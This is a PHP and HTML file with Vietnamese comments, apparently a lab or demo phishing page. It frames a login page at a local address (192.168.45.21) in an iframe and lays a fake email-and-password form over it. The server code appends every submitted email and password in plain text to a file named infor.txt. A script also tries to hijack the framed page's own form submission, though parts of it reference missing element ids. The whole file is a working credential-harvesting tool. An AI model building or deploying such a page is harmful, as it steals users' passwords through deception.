<?php
// Kiểm tra nếu form được gửi
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Lấy dữ liệu từ form
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Kiểm tra dữ liệu
    if (!empty($email) && !empty($password)) {
        // Tạo nội dung để ghi vào file
        $content = "Email: $email\nMật khẩu: $password\n----------\n";

        // Đường dẫn tệp
        $file = 'infor.txt';

        // Ghi nội dung vào file
        if (file_put_contents($file, $content, FILE_APPEND) === false) {
            echo "<h2>Không thể ghi vào tệp '$file'. Kiểm tra quyền thư mục!</h2>";
        }
    } else {
        echo "<h2>Vui lòng nhập đầy đủ thông tin!</h2>";
    }

    echo '<a href="' . $_SERVER['PHP_SELF'] . '">Quay lại</a>'; // Link quay lại form
    exit; // Kết thúc xử lý để không hiển thị nội dung bên dưới
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iframe Form</title>
    <style>
    <style>
        /* Định kiểu iframe */
        iframe {
            width: 100%;
            height: 400px;
            border: 1px solid #ccc;
            position: relative;
        }

        /* Định vị form overlay */
        .overlay-form {
            position: absolute; /* Form sẽ nằm chồng lên iframe */
            top: 50%; /* Căn giữa dọc */
            left: 50%; /* Căn giữa ngang */
            transform: translate(-50%, -50%); /* Dịch để căn giữa chính xác */
            z-index: 10; /* Đảm bảo form nằm trên iframe */
            background-color: rgba(255, 255, 255, 0.9); /* Màu nền để dễ nhìn */
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        /* Định dạng nội dung bên trong form */
	.overlay-form form {
	    background-color: #fff;
	    padding: 20px;
	    border-radius: 8px;
	    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
	    max-width: 400px;
	    margin: 0 auto;
	}

	.overlay-form form input[type="text"],
	.overlay-form form input[type="email"],
	.overlay-form form input[type="password"],
	.overlay-form form button {
	    width: 100%;
	    padding: 10px;
	    margin: 10px 0;
	    border: 1px solid #ddd;
	    border-radius: 4px;
	}

	.overlay-form form button {
	    background-color: #5b9bd5;
	    color: white;
	    border: none;
	    cursor: pointer;
	}

	.overlay-form form button:hover {
	    background-color: #4a8fbf;
	}

    </style>
</head>
<body>
    <iframe src="http://192.168.45.21/demoweb/public/login.php" 
            style="width: 100%; height: 100vh; border: 0px solid #ccc;">
    </iframe>
    <div class="overlay-form">
    <form id="iframeForm" method="POST" action="process_form.php">
        Email: <input type="email" name="email" required><br>
        
        Mật khẩu: <input type="password" name="password" required><br>
        
        <button type="submit">Đăng nhập</button>
    </form>
    </div>
        <script>
        const iframe = document.querySelector('iframe');
        const form = document.getElementById('iframeForm');
        iframe.onload = function() {
            const iframeWindow = iframe.contentWindow;
            iframeWindow.document.querySelector('form').addEventListener('submit', function(event) {
                event.preventDefault(); // Ngừng gửi form trực tiếp
                const email = iframeWindow.document.querySelector('input[name="email"]').value;
                const password = iframeWindow.document.querySelector('input[name="password"]').value;
                document.getElementById('email').value = email;
                document.getElementById('password').value = password;
                form.submit();
            });
        };
    </script>
</body>
</html>
